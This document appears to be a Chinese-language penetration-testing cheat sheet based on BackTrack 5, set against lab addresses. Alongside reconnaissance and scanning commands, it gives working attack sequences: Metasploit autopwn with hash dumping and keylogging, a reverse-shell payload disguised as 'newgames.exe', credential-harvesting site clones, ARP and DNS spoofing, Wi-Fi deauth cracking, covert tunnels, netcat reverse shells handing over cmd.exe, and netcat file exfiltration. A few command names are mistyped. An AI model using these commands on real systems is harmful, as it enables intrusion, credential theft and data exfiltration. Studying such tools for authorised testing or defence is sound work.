## 目录
* [一、BT5.2011.1.信息收集](#一BT520111信息收集)  
* [二、BT5.2011.2.扫描工具](#二BT520112扫描工具)  
* [三、BT5.2011.3.漏洞发现](#三BT520113漏洞发现)  
* [四、BT5.2011.4.社会工程学](#四BT520114社会工程学) 
* [五、BT5.2011.5.运用层攻击MSF](#五BT520115运用层攻击MSF) 
* [六、BT5.2011.6.局域网攻击](#六BT520116局域网攻击) 
* [七、BT5.2011.7.密码破解](#七BT520117密码破解) 
* [八、BT5.2011.8.维持访问](#八BT520118维持访问) 


***
### 一、BT5.2011.1.信息收集
#### 1、DNS信息收集
##### 1）Dnsenum介绍
* 使用google搜索引擎获取额外的名字与子域名
* 使用一个TXT文件暴力破解子域名
* 使用Whois查询C类网络范围，并且计算网络范围
* 反向查询
* 支持多重查询
```
./dnsenum.pl -f dns.txt --dnsserver 8.8.8.8 cisco.com -o cisco.txt
-f dns.txt：指定暴力破解字典文件，可以换成dns-big.txt
--dnsserver：指定dns服务器
cisco.com：指定目标域
-o cisco.txt：输出到文件cisco.txt
```
##### 2）Dnsmap介绍
类似于dnsenum，可使用内建的“wordlist”来暴力破解子域，也可自定义wordlist，把结果输出为CSV格式
```
./dnsmap cisco.com -w wordlist_TLAs.txt -c cisco.csv
cisco.com:指定目标域
-w：指定字典
-c：输出文件
```
#### 2、路由信息收集
##### 1）tcptraceroute介绍
* 传统traceroute技术发送UDP或者ICMP ECHO，而tcptraceroute发送TCP SYN包到目标
* tcpttraceroute的好处，就算在目标之前存在防火墙，它阻止了普通的traceroute流量，但是适当TCP端口的流量，防火墙是放行的
* tcptraceroute收到SYN/ACK表示端口是开放的，收到RST表示端口是关闭的
```
tcptraceroute www.cisco.com
```
##### 2）tctrace介绍
类似于tcptraceroute，它不使用ICMP ECHO而是使用TCP SYN数据包
```
./tctrace -i eth2 -d www.cisco.com
```
#### 3、All-in-one智能收集
##### 1）Maltego介绍
* 开放源的智能信息收集工具，收集以下内容：
    * 域名
    * DNS名
    * Whois信息
    * 网段
    * IP地址
* 还能收集个人的信息，如下：
    * 公司或组织关联到的人
    * 电邮地址关联到的人
    * 网站关联到的人
    * 社区关联到的人
    * 电话号码关联到的人
### 二、BT5.2011.2.扫描工具
#### 1、主机发现
```
ifconfig eth1 [主机IP] netmask [掩码]
注：配置IP
route add default gw [网关IP]
注：配置默认网关
netstat -r
注：查看路由表
vi /etc/resolv.conf
注：配置DNS
```
##### 1）arping
对直连网络，使用ARP request进行测试，一个特定IP是否正在被使用
```
arping -c 10.1.1.1
```
##### 2）fping
使用ICMP ECHO一次请求多个主机
```
fping -s -r 1 -g 10.1.1.1 10.1.1.100
```
##### 3）genlist
获取使用清单，通过ping探针的响应
```
genlist -s 10.1.1.\*
```
##### 4）hping3
支持发送自定义包和显示目标的回应，支持TCP，UDP，ICMP和RAW-IP协议
```
hping3 -c 2 10.1.1.1
注：简单使用
hping3
hping send {ip(daddr=10.1.1.1)+icmp(type=8,code=0)}
hping recv eth1
注：复杂使用
```
##### 5)nbtscan
扫描一个IP地址范围的NetBIOS名字信息，将提供一个关于IP地址，NetBIOS计算机名，服务可用性，登录用户名和MAC地址的报告
```
nbtscan 10.1.1.1-254
```
##### 6)nping
允许用户产生各种网络数据包（TCP，UDP，ICMP，ARP），也允许用户自定义协议头部
```
nping -c 1 --tcp -p 80 --flags syn 10.1.1.1
注：返回SYN/ACK
nping -c 1 --tcp -p 80 --flags ack 10.1.1.1
注：返回RST
nping -c 1 --udp -p 80 10.1.1.1
注：返回ICMP的Port unreachable
```
##### 7)onesixtyone
snmp扫描工具，用于找出设备上的SNMP Community字串
```
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.1.1.2
```
##### 8）protos
扫描特定主机上所支持的协议
```
protos -i eth1 -d 10.1.1.1 -v
```
#### 2、操作系统指纹
##### 1）p0f
一个被动的操作系统指纹监控工具，Cisco IPS就是用这个程序获取目标的操作系统
```
p0f
注：等待连接，查看结果
```
##### 2）xprobe2
主动OS指纹探测工具
```
xprobe2 10.1.1.1
```
#### 3、端口扫描
##### 1）autoscan
图形化工具，Kali2.0没有预装
##### 2）netifera
图形化工具，Kali2.0没有预装 
##### 3）nmap
一个综合性、并且特性丰富的端口扫描工具，一个渗透测试者的必备工具，包含如下能力
* 主机发现
* 服务于版本检测
* 操作系统检测
* 网络追踪
* nmap脚本引擎
```
nmap -v -n -sP 10.1.1.0/24
-v：显示结果
-n：不做DNS解析
-sP：ping扫描
nmap -v -n -A 10.1.1.1
-A：综合扫描，包含端口扫描，服务的版本，主机的操作系统等
```
#### 4、服务探测
##### 1）amap
用于检测特定端口上运行的具体运用
```
amap -bq 10.1.1.1 80
```
##### 2）httprint
用于检测HTTP服务器的软件和版本
```
httprint -h 10.1.1.1 -s signatures.txt
注：Kali2.0没有预装
```
##### 3）httsquash
扫描HTTP服务器工具，收集banner和获取数据
```
httsquash -r 10.1.1.1
```
#### 5、VPN探测
##### 1）ike-scan
IKE扫描工具，用于探测IPSec VPN服务器支持的策略
```
ike-scan -M -v 10.1.1.2
```
##### 2）sslscan
扫描支持的策略
```
sslscan 10.1.1.2
```
### 三、BT5.2011.3.漏洞发现
#### 1、Cisco工具
##### 1）Cisco Auditing Tool（CAT）
安全审计工具，扫描Cisco路由器的一般性漏洞，例如默认密码，SNMP community字串和一些老的IOS bug
```
CAT -h 10.1.1.2 -w /usr/share/cisco-auditing-tool/lists/community -a /usr/share/cisco-auditing-tool/lists/passwords -i
```
##### 2）Cisco Passwd Scanner
用于发现拥有默认telnet密码“cisco”的Cisco设备
```
ciscos 10.1.1 3 -t 4 -C 10
注：Kali2.0没有预装
```
#### 2、SNMP工具
##### 1）ADMsnmp
用于暴力破解SNMP community字串，使用一个预先定义的wordlist
```
ADMsnmp 10.1.1.2 -wordf snmp.passwd
注：Kali2.0没有预装
```
##### 2）Snmp Enum
在获取community后，可以使用snmp enum获取大量关于Cisco、windows和linux的信息
```
snmpenum.pl 10.1.1.2 private cisco.txt
```
#### 3、HTTP工具
##### 1）Burp Suite
web运用安全工具，能够扫描、分析和攻击web运用，通过手动和自动的技术
java -jar burpsuite_v1.4.jar
##### 2）Grendel Scan
自动web运用安全评估工具，扫描、检测、攻击普通的web运用的脆弱性，并把扫描结果生成一个报告
```
grendel.sh
注：Kali2.0没有预装
```
##### 3）nikto2
高级web服务器安全扫描工具，扫描并检测，由于服务器配置失误而造成的安全隐患
```
nikto -h 10.1.1.1 -C -p 80 -T 3478b -t 3 -D \ V -o webtest -F htm
```
##### 4）W3AF
特性丰富的web运用攻击和审计的框架，协助检测和攻击web的脆弱性
注：Kali2.0没有
##### 5）WAFW00F
用来测试WAF（web application firemall）的工具
```
waf00f.py http://10.1.1.1
```
#### 4、SMB工具
##### 1）samrdump
用于访问（DCE/RPC）服务，能够列出所有的系统服务，用户账号和其他有用的信息
```
samrdump.py cisco:cisco@10.1.1.1 445/SMB
```
#### 5、综合漏洞发现工具Nessus
```
    下载nessus并安装：dpkg -i Nessus-6.5.3-debian6_i386.deb
    启动软件：/etc/init.d/nessusd start
    打开浏览器，http://localhost:8834（注：http://www.tenable.com/products/nessus-homefeed进行注册）
    Scans->Add->Name[cisco]->ScanTargets[10.1.1.1]->Policy[Internal Network Scan]->Launch Scan
```
### 四、BT5.2011.4.社会工程学
setoolkit：高级的、多功能的，并且易于使用的计算机社会工程学工具集
##### 1、Java Applet Attack Method
```
    setoolkit
    1）Social-Engineering Attacks
    2）Website Attack Vectors
    1）Java Applet Attack Method
    2）Site Cloner[http://www.baidu.com]
    略w
    1）E-Mail Attack Single Email Address
```
##### 2、Credential Harvester Attack Method
```
    setoolkit
    1）Social-Engineering Attacks
    2）Website Attack Vectors
    3）Credential Harvester Attack Method
    2）Site Cloner[https://gmail.com]
    略
    1）E-Mail Attack Single Email Address
```
### 五、BT5.2011.5.运用层攻击MSF
Metasrploit Framework(http://www.metasploit.com)是一个高级攻击攻击套件，MSF采用了模块化的设计，便于攻击者使用编程技能扩展和开发自定义插件和工具
#### 1、MSF连环攻击
```
    msfconsole
    db_nmap -T Aggressive -sV -n -O -v 10.1.1.2
    db_hosts
    db_services
    db_autopwn -p -t -I 10.1.1.2 -e
    session -i
    getuid
    sysinfo
    run hashdump(复制结果到文件，如：sam-new-test)
    ps
    migrate 1576(找到一个管理员进程ID，权限提升)
    keyscan_start(键盘记录)
    keyscan_stop
    run getgui -e(打开远程桌面)
    run getgui -u cisco -p cisco
    rdesktop 10.1.1.2:3389

    ophcrack -g -d [字典文件] -t [字典文件] -f [密码文件，如上：sam_new_test]
```
#### 2、MSF离线攻击
```
    msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=33333 X > /tmp/newgames.exe

    msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 10.1.1.1
    set LPORT 33333
    exploit
```
### 六、BT5.2011.6.局域网攻击
#### 1、MAC泛洪攻击
交换机的CAM表没有记录主机的MAC，就向整个广播域（整个VLAN）泛洪
攻击原理：
    攻击主机制造大量随机伪装源MAC地址包进入交换机，使交换机的CAM表满，造成mac泛洪（unknown unicast flooding），相当于交换机变成集线器，攻击主机这时就可以抓取局域网中的其他主机间的数据交互
```
    macof
    注：攻击主机可能需要多开几个
```
#### 2、yersinia
```
    yersinia -G
    注：图形界面
```
##### 1）CDP
Cisco Discovery Protocol，思科设备能够在它们直连的设备之间分享有关操作系统软件版本、IP地址、硬件平台等相关信息
```
    launch attack->CDP->flooding CDP table
```
##### 2）DHCP
```
    launch attack->DHCP->sending DISCOVER packet
    注：攻击者需要搭建自己的DHCP服务器
```
##### 3）DTP
Dynamic Trunk Protocol是一项动态中继协议，可以让Cisco交换机自动协商制定交换机之间的链路是否形成trunk
```
    launch attack->DTP->enabling trunking
```
##### 4）HSRP
Hot Standby Routing Protocol（热备份路由协议），作用是能够把一台或多台路由器用来做备份，所谓热备份是指当使用的路由器不能正常工作时，候补的路由器能够实现平滑的替换
```
    launch attack->HSRP->becoming ACTIVE router
```
##### 5）STP
Spanning Tree Protocol生成树协议，可应用于网络中建立树g形拓扑，消除网络中的环路，并可通过一定的方法实现路径冗余
```
    launch attack->STP->Claiming Root Role
```
#### 3、arpspoof
```
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -t 10.1.1.1 10.1.1.2
    arpspoof -t 10.1.1.2 10.1.1.1
```
#### 4、ettercap
##### 1）ARP欺骗
```
    ettercap -G（图形界面）
    Sniff->Unified sniffing->选择网卡
    Hosts->Scan for hosts
    目标主机1->Add to Target1
    目标主机2->Add to Target2
    Mitm->arp poisoning->Sniff remote connections
    Start->Start sniffing
    dsniff(抓包)
```
##### 2）DNS欺骗
```
    vi /usr/share/ettercap/etter.dns

    www.baidu.com  A   192.168.1.101 
    注：欺骗www.baidu.com的DNS为192.168.1.101

    ettercap -G（图形界面）
    Sniff->Unified sniffing->选择网卡
    Hosts->Scan for hosts
    目标主机1->Add to Target1
    目标主机2->Add to Target2
    Mitm->arp poisoning->Sniff remote connections
    Start->Start sniffing
    Plugins->Manage the plugins->dns_spoof双击

    注：配合setoolkit工具使用，克隆一个网站（如：mail.google.com的邮箱）
```
### 七、BT5.2011.7.密码破解
#### 1、无线密码破解
```
    airmon-ng start wlan0
    注：开始查看无线
    airodump-ng -w mingjiaotest mon0
    注：开始对所有网络监控
    airodump-ng -c 5 -w mingjiaotest mon0
    注：对5号信道进行监控
    aireplay-ng -0 5 -a [AP的MAC地址] -c [客户的MAC地址] mon0
    注：开始做5次deauth攻击
    aricrack-ng -w [字典] mingjiaotest-*.cap 
    注：破解密码 
```
#### 2、Cisco密码破解
```
    ncrack -U pass -v -P pass telnet://10.1.1.2
    -U：user的字典
    -P：密码的字典
```
### 八、BT5.2011.8.维持访问
#### 1、DNS隧道技术
```
    网络拓扑规划：DNS服务器10.1.1.1，目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101

    准备DNS服务器，正向查找区域里创建一个域（如：mingjiao.org），并创建一个主机映射（如：dnstunnelserver,主机(A),另一台主机IP10.1.1.100），再创建一个子域（如：dnstunnel），指定dnstunnel子域的域名服务器为dnstunnelserver.mingjiao.org

    nslookup
    set type=ns
    dnstunnel.mingjiao.org
    注：服务端测试dns

    vi dns2tcpd.conf
    listen=0.0.0.0
    port=53
    user=nobody
    chroot=/tmp
    domain=dnstunnel.mingjiao.org
    resources=ssh:10.1.1.2:22
    注：服务端主机配置文件，10.1.1.2为目标地址IP
    dns2tcpd -F -d 1 -f dns2tcpd.conf
    注：启动服务端，当请求dns，就把连接转到ssh：10.1.1.2:22上

    dns2tcpc -z dnstunnel.mingjiao.org
    注：客户端测试服务器状态

    vi dns2tcpc.conf
    domain=dnstunnel.mingjiao.org
    resource=ssh
    local_port=2222
    debug_level=1
    注：客户端配置文件
    dns2tcpc -c -f dns2tcpc.conf
    注：启动客户端，此时服务端和客户端有个DNS的隧道（UDP 53端口）

    ssh -p 2222 cisco@127.0.0.1
    注：客户端连接127.0.0.1：2222，就会把ssh请求封装在DNS隧道里，然后服务端会去连接10.1.1.2:22
```
#### 2、Ping隧道技术
```
    网络拓扑规划：目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101

    ptunnel
    注：服务器打开服务
    ptunnel -p 10.1.1.100 -lp 2222 -da 10.1.1.2 -dp 22
    注：客户端建立连接

    ssh -p 2222 cisco@127.0.0.1
    注：客户端连接127.0.0.1：2222，就会把ssh请求封装在PING隧道里，然后服务端会去连接10.1.1.2:22
```
#### 3、SSL隧道技术
```
    网络拓扑规划：目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101

    vi stunnel.conf
    cert=/etc/stunnel/stunnel.pem
    chroot=/var/run/stunnel/
    pid=/stunnel.pid
    [telnets]
    accept=2323
    connect=10.1.1.2:23
    注：服务端主机配置文件，10.1.1.2为目标地址IP，需要手动创建/var/run/stunnel目录
    stunnel /etc/stunnel/stunnel.conf
    注：启动服务端

    vi stunnel.conf
    chroot=/var/run/stunnel/
    pid=/stunnel.pid
    client=yes
    [telnets]
    accept=2323
    connect=10.1.1.100:2323
    注：客户端配置文件，需要手动创建/var/run/stunnel目录
    stunnel /etc/stunnel/stunnel.conf

    telnet 127.0.0.1 2323
    注：客户端连接127.0.0.1：2323，就会把telnet请求封装在SSL隧道里，然后服务端会去连接10.1.1.2:22
```
#### 4、代理服务器3proxy
```
    网络拓扑规划：目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101

    vi 3proxy.cfg
    auth none
    flush
    external 10.1.1.100
    internal 10.1.1.100
    maxconn 300
    tcppm 80 10.1.1.2 80
    注：服务端主机配置文件
    3proxy 3proxy.conf
    注：启动服务端，当连接服务器10.1.1.100:80时，就把连接转到10.1.1.2:80上

    http://10.1.1.100
    注：客户端连接
```
#### 5、Netcat
* 攻击主机主动连接
```
    nc.exe -d -L -p 1234 -e cmd.exe
    注：NC制造后门（目标主机）
    -p 1234：启动1234端口
    -e cmd.exe：当1234端口被连接时，把cmd.exe返回客户端

    nc 10.1.1.1 1234
    注：攻击主机获得目标主机的cmd
```
* 攻击主机监听，等待被连接
```
    nc -l -p 1234
    注：攻击主机1234端口上开启监听

    nc.exe -d 10.1.1.101 1234 -e cmd.exe
    注：目标主机连接攻击主机1234端口，并把cmd.exe送给攻击主机
```
* nc传送文件
```
    nc.exe -u 10.1.1.101 53 < test.txt
    注：目标主机把test.txt文件通过UDP 53端口传送给10.1.1.101
    nc -l -u -p 53 >fileyeslab.txt
    注：攻击主机监听UDP 53端口，并把收到的文件保存到fileyeslab.txt
```
* nc启动中继
```
    vi telnet_relay
    #!/bin/bash
    nc -o telnet.hack.out 10.1.1.2 23
    注：服务端主机配置文件，连接10.1.1.2 23时，把抓包输出到telnet.hack.out文件
    nc -l -p 23 -e telnet_relay
    注：攻击主机监听23端口

    telnet 10.1.1.100
    注：客户端连接10.1.1.100时，把连接传给10.1.1.2 23，并记录抓包
```